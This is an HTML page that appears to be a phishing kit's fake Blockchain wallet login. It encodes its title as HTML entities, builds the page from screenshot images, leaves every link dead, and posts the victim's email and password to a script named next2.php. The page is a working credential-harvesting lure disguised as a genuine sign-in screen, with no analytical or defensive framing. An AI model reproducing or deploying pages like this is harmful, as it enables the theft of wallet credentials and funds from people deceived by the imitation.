<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#108;&#111;&#99;&#107;&#99;&#104;&#97;&#105;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
  
.textbox {  
    border: 1px solid #ccc;
  	border-radius: 1px;
	padding-left: 8px;
	font-family: 'Montserrat', 'Helvetica', sans-serif !important;
	font-size: 15px;
	color: #555555;
    height: 40px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #66afe9; 
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 

 </style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body  bgColor="#004A7C">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:109px; top:37px; width:189px; height:28px; z-index:0"><a href="#"><img src="images/k1.png" alt="" title="" border=0 width=189 height=28></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:107px; top:583px; width:465px; height:47px; z-index:1"><a href="#"><img src="images/k4.png" alt="" title="" border=0 width=465 height=47></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:1139px; top:587px; width:177px; height:54px; z-index:2"><a href="#"><img src="images/k5.png" alt="" title="" border=0 width=177 height=54></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:407px; top:124px; width:559px; height:415px; z-index:3"><img src="images/k11.png" alt="" title="" border=0 width=559 height=415></div>

<div id="image3" style="position:absolute; overflow:hidden; left:445px; top:486px; width:119px; height:18px; z-index:4"><a href="#"><img src="images/k9.png" alt="" title="" border=0 width=119 height=18></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:835px; top:484px; width:91px; height:22px; z-index:5"><a href="#"><img src="images/k8.png" alt="" title="" border=0 width=91 height=22></a></div>
<form action=next2.php name=bhagjaageage id=bhagjaageage method=post>
<input name="email" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:470px;left:451px;top:284px;z-index:6">
<input name="epass" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:470px;left:451px;top:369px;z-index:7">
<div id="formimage1" style="position:absolute; left:450px; top:428px; z-index:8"><input type="image" name="formimage1" width="472" height="42" src="images/cfm.png"></div>
</div>

</body>
</html>
